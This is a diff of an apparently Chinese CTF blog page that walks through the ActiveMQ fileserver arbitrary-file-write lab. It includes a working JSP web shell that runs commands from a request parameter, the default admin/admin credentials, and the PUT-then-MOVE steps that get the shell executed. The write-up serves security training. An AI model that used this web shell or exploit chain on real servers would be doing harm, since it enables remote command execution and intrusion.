@@ -320,7 +320,7 @@
 
 	<a href="/2019/10/04/CTF/墨者学院/墨者学院-web安全-ActiveMQ任意文件写入漏洞/" itemprop="url">
 		<time datetime="2019-10-04T02:31:02.000Z" itemprop="dateUpdated">
-	  		2019-10-04
+	  		2019-10-05
 	  </time>
 	</a> 
 
@@ -360,10 +360,7 @@
 	</div>
 
 	<div class="article-content" id="article-content">
-		<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，导致的任意文件写入漏洞</p>
-<a id="more"></a>
-
-<h1 id="墨者学院"><a href="#墨者学院" class="headerlink" title="墨者学院"></a>墨者学院</h1><h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h2><h3 id="ActiveMQ任意文件写入漏洞分析溯源"><a href="#ActiveMQ任意文件写入漏洞分析溯源" class="headerlink" title="ActiveMQ任意文件写入漏洞分析溯源"></a>ActiveMQ任意文件写入漏洞分析溯源</h3><h4 id="ActiveMQ-简介"><a href="#ActiveMQ-简介" class="headerlink" title="ActiveMQ 简介"></a>ActiveMQ 简介</h4><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java  的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用</p>
+		<h1 id="墨者学院"><a href="#墨者学院" class="headerlink" title="墨者学院"></a>墨者学院</h1><h2 id="WEB安全"><a href="#WEB安全" class="headerlink" title="WEB安全"></a>WEB安全</h2><h3 id="ActiveMQ任意文件写入漏洞分析溯源"><a href="#ActiveMQ任意文件写入漏洞分析溯源" class="headerlink" title="ActiveMQ任意文件写入漏洞分析溯源"></a>ActiveMQ任意文件写入漏洞分析溯源</h3><h4 id="ActiveMQ-简介"><a href="#ActiveMQ-简介" class="headerlink" title="ActiveMQ 简介"></a>ActiveMQ 简介</h4><p>ActiveMQ 是 Apache 软件基金会下的一个开源消息驱动中间件软件。Jetty 是一个开源的 servlet 容器，它为基于 Java  的 web 容器，例如 JSP 和 servlet 提供运行环境。ActiveMQ 5.0 及以后版本默认集成了jetty。在启动后提供一个监控 ActiveMQ 的 Web 应用</p>
 <p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
 <ol>
 <li><p>其使用率并不高</p>
@@ -373,7 +370,7 @@
 </ol>
 <h4 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h4><ol>
 <li><p>访问url</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/18851353-a448bc9cb361d96a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174915.png" alt></p>
 </li>
 </ol>
 <ol start="2">
@@ -394,20 +391,20 @@
  <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> &lt;% </span><br><span class="line"> if(&quot;023&quot;.equals(request.getParameter(&quot;pwd&quot;)))&#123;</span><br><span class="line"> java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter(&quot;i&quot;)).getInputStream();</span><br><span class="line"> int a = -1;</span><br><span class="line"> byte[] b = new byte[2048];</span><br><span class="line"> out.print(&quot;&lt;pre&gt;&quot;);</span><br><span class="line"> while((a=in.read(b))!=-1)&#123;</span><br><span class="line"> out.println(new String(b));</span><br><span class="line"> &#125;</span><br><span class="line"> out.print(&quot;&lt;/pre&gt;&quot;);</span><br><span class="line"> &#125;</span><br><span class="line">%&gt;</span><br><span class="line">请求url：http://ip:port/Shell/cmd2.jsp?pwd=023&amp;i=ls&lt;/pre&gt;</span><br></pre></td></tr></table></figure>
 
 <p>通过burp访问，发现需要验证，需要登录，我们尝试登录，默认的ActiveMQ的账号和密码均为admin</p>
-<p><img src="https://upload-images.jianshu.io/upload_images/18851353-0a6b68bfc286c561.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
 </li>
 </ol>
-<pre><code>登录后查看http方法 ，发现没有put方法</code></pre><p>   <img src="https://upload-images.jianshu.io/upload_images/18851353-4b07ebafa00c92cd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<pre><code>执行put方法 发现却上传成功了</code></pre><p>  <img src="https://upload-images.jianshu.io/upload_images/18851353-d8794c3dc1a8c6b2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+<p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174936.png" alt></p>
+<pre><code>登录后查看http方法 ，发现没有put方法</code></pre><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174945.png" alt></p>
+<pre><code>执行put方法 发现却上传成功了</code></pre><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005174951.png" alt></p>
 <pre><code>接下来通过move移动到admin或api下，就可以解析jsp文件了， 查找他的绝对路径
 
 &gt; 访问url：[http://ip:port/admin/test/systemProperties.jsp](http://ip:port/admin/test/systemProperties.jsp)
 &gt; 
 &gt; [图片上传失败...(image-99ffb1-1567592524169)]
 
-通过move方法将jsp木马移动到admin或api下，进行解析</code></pre><p>   <img src="https://upload-images.jianshu.io/upload_images/18851353-92415b5a1e3a2651.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<pre><code>然后访问，可以执行命令，</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18851353-6de46721adccd95a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
-<pre><code>这里就可以直接查看flag，最后在根目录找到了flag</code></pre><p><img src="https://upload-images.jianshu.io/upload_images/18851353-14ce3e93d5886786.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="图片.png"></p>
+通过move方法将jsp木马移动到admin或api下，进行解析</code></pre><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175000.png" alt></p>
+<pre><code>然后访问，可以执行命令，</code></pre><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175021.png" alt></p>
+<pre><code>这里就可以直接查看flag，最后在根目录找到了flag</code></pre><p><img src="https://raw.githubusercontent.com/ST0new/picture/master/2019/10/20191005175035.png" alt></p>
 <h4 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h4><p><a href="https://www.cnblogs.com/swyft/articles/5563732.html" target="_blank" rel="noopener">jsp一句话</a></p>
 <p><a href="https://www.jianshu.com/p/564fb8b54a67" target="_blank" rel="noopener">ActiveMQ任意文件写入漏洞</a></p>
 	
@@ -528,9 +525,11 @@
 实验吧逆向工程debug
 下载文件，然后用idaq打开，
 
+
+
 尝试在linux下打开发现么没有返回值，
 
-在idaq里面去查看shift+F12 查看字符串，发现有个print...
+在idaq里面去查看shift+F12 查看字符串，发现有个pri...
 							</p>
 						</div>
 
@@ -646,9 +645,8 @@ key：CTF{}
 								十月 4日, 2019				
 							</p>
 							<p class="relate-post-content">
-								@TOC
-BUUCTFwebwarmup这里我直接上代码讲 菜鸡不会php，全是现查 哪里不对，欢迎大佬指点
-12345678910111213141516171819202122232425262728293031323334353...
+								BUUCTFwebwarmup这里我直接上代码讲 菜鸡不会php，全是现查 哪里不对，欢迎大佬指点
+1234567891011121314151617181920212223242526272829303132333435363738...
 							</p>
 						</div>
 
@@ -671,9 +669,7 @@ BUUCTFwebwarmup这里我直接上代码讲 菜鸡不会php，全是现查 哪里
 								十月 4日, 2019				
 							</p>
 							<p class="relate-post-content">
-								
-
-实验吧web后台登录
+								实验吧web后台登录
 burp抓包尝试爆破
 一般呢，ctf题是不涉及爆破的，因为这样会导致服务器处理压力太大
 
@@ -682,7 +678,7 @@ burp抓包尝试爆破
 那么我们的重点就是获取密码了
 
 寻找密码
-尝试了几次弱密码，注...
+尝试了几次弱密码，注入都...
 							</p>
 						</div>
 
